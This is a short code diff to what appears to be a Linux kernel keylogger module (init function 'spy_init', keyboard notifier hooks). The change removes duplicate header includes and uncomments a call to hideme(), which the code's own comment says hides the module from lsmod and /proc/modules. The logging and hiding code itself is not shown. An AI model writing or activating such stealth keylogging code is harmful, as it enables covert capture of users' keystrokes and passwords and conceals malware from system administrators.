@@ -25,14 +25,9 @@
 #include <linux/keyboard.h>
 #include <linux/debugfs.h>
 #include <linux/input.h>
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/keyboard.h>
 #include <linux/notifier.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
-#include <linux/init.h>
-#include <linux/module.h>
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 #include <linux/namei.h>
@@ -327,7 +322,7 @@ static int __init spy_init(void)
 
 	#ifdef HIDE_MODULE
 		/* Hide myself from lsmod and /proc/modules :) */
-		// hideme();
+		hideme();
 	#endif
 	/*
 	 * Add to the list of console keyboard event
